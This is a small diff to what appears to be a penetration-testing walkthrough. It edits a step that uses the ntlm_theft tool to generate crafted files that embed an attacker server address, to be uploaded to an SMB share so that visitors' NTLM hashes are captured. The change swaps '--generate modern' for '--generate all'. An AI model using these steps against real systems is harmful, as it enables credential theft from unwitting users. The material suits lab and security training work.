@@ -20,7 +20,7 @@ git clone https://github.com/Greenwolf/ntlm_theft.git
 This command creates a directory named `meetingXYZ/` containing multiple crafted files. Each file embeds a reference to the attacker’s server. 
 
 ```bash
-python3 ntlm_theft.py --verbose --generate modern --server <attacker_ip> --filename <filename>
+python3 ntlm_theft.py --verbose --generate all --server <attacker_ip> --filename <filename>
 ```
 
 2. **Upload the files to SMB**
